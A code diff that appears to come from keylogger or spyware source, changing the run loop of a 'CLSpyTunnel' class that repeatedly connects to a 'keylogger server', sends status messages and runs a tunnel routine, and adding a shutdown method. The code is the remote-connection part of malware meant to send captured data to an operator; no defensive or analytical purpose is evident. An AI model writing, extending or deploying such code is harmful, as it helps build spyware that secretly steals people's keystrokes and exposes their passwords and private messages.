@@ -22,9 +22,7 @@ void CLSpyTunnel::run() {
     int error = 0;
     socklen_t len = sizeof(error);
     
-    while (!*p_shutdown_flag_) {
-        retry_flag_ = false;
-        
+    while (!*p_shutdown_flag_) {        
         socket_ = socket(AF_INET, get_conn_type(), 0);
         if (socket_ < 0) {
             printf("Socket creation failed: %s\n", strerror(errno));
@@ -47,9 +45,14 @@ void CLSpyTunnel::run() {
         }
         printf("Connected to keylogger server %s:%d\n", ip_, port_);
 
-        while (!retry_flag_ && !*p_shutdown_flag_) {
+        while (!tunnel_shutdown_flag_ && !*p_shutdown_flag_) {
             // Connection successful
-            retry_flag_ = send_out(socket_, EXEC_SUCCESS);
+            rc = send_out(socket_, EXEC_SUCCESS);
+            if (rc < 0) {
+                printf("Error sending data: %s\n", strerror(errno));
+                break;
+            }
+
             exec_tunnel();
         }
 
@@ -59,5 +62,13 @@ void CLSpyTunnel::run() {
                 socket_ = -1;
                 sleep(1);
             }
+    }
+}
+
+void CLSpyTunnel::shutdown() {
+    tunnel_shutdown_flag_ = true;
+    if (socket_ >= 0) {
+        close(socket_);
+        socket_ = -1;
     }
 }
